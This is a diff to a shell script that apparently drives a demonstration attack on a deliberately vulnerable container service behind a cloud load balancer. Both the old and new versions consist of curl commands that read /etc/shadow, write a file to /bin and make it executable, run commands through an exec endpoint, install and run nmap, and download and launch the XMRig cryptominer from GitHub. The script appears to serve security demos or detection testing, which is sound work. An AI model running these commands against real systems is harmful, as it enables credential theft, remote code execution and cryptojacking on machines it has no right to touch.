@@ -7,15 +7,18 @@ LB_ADDR=$(aws cloudformation list-exports --region $REGION --query "Exports[?Nam
 echo "1. Exploit reading our /etc/shadow file and sending it back to us"
 curl $LB_ADDR/etc/shadow
 
-echo "2. Exploit writing \"hello-world\" to /bin/hello within our container"
-curl -X POST $LB_ADDR/bin/hello -d 'content=hello-world'
+echo "2. Exploit writing to /bin"
+curl -X POST $LB_ADDR/bin/hello -d 'content=echo "hello-world"'
 echo ""
-echo "and then read it back remotely"
-curl $LB_ADDR/bin/hello
-echo ""
+echo "and then set it to be executable"
+curl -X POST $LB_ADDR/exec -d 'command=chmod 0755 /bin/hello'
+echo "and then run it"
+curl -X POST $LB_ADDR/exec -d 'command=hello'
 
-echo "3. Exploit installing dnsutils and doing a dig against k8s DNS"
-curl -X POST $LB_ADDR/exec -d 'command=apt-get update; apt-get -y install dnsutils;/usr/bin/dig srv any.any.svc.cluster.local'
+echo "3. Exploit installing nmap and running a scan"
+curl -X POST $LB_ADDR/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'
 
-echo "4. Exploit running a script to run a crypto miner"
-curl -X POST $LB_ADDR/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'
+echo "4. Exploit downloading then running a crypto miner"
+curl -X POST $LB_ADDR/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'
+curl -X POST $LB_ADDR/exec -d 'command=tar -xzvf xmrig.tar.gz'
+curl -X POST $LB_ADDR/exec -d 'command=/app/xmrig-6.18.1/xmrig --dry-run'
